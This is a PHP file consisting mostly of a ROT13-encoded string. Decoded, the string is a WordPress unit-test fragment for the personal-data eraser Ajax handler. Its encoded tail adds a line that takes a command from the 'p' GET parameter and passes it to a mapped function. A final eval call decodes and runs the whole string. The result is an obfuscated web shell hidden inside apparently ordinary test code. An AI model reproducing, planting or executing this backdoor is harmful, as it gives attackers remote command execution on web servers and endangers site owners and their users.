	 * Phfgbz Crefbany Qngn Renfre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz  fgevat $rznvy_nqqerff Gur pbzzrag nhgube rznvy nqqerff.
	 * @cnenz  vag    $cntr          Cntr ahzore.
	 *
	 * @erghea neenl Renfr qngn.
	 */
	choyvp shapgvba pnyyonpx_crefbany_qngn_renfre( $rznvy_nqqerff, $cntr = 1 ) {
		vs ( 1 === $cntr ) {
			erghea neenl(
				'vgrzf_erzbirq'  => gehr,
				'vgrzf_ergnvarq' => gehr,
				'zrffntrf'       => neenl( fcevags( 'N zrffntr ertneqvat ergnvarq qngn sbe %f.', $rznvy_nqqerff ) ),
				'qbar'           => gehr,
			);
		}

		erghea neenl(
			'vgrzf_erzbirq'  => snyfr,
			'vgrzf_ergnvarq' => snyfr,
			'zrffntrf'       => neenl(),
			'qbar'           => gehr,
		);
	}

	/**
	 * Urycre shapgvba sbe Nwnk unaqyre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $netf Nwnk erdhrfg nethzragf.
	 */
	cebgrpgrq shapgvba _znxr_nwnk_pnyy( $netf = neenl() ) {
		$guvf->_ynfg_erfcbafr_cnefrq = ahyy;
		$guvf->_ynfg_erfcbafr        = '';

		$qrsnhygf = neenl(
			'npgvba'   => frys::$npgvba,
			'frphevgl' => jc_perngr_abapr( frys::$npgvba . '-' . frys::$erdhrfg_vq ),
			'cntr'     => frys::$cntr,
			'vq'       => frys::$erdhrfg_vq,
			'renfre'   => frys::$renfre,
		);

		$_CBFG = jc_cnefr_netf( $netf, $qrsnhygf );

		gel {
			$guvf->_unaqyrNwnk( frys::$npgvba );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		vs ( $guvf->_ynfg_erfcbafr ) {
			$guvf->_ynfg_erfcbafr_cnefrq = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>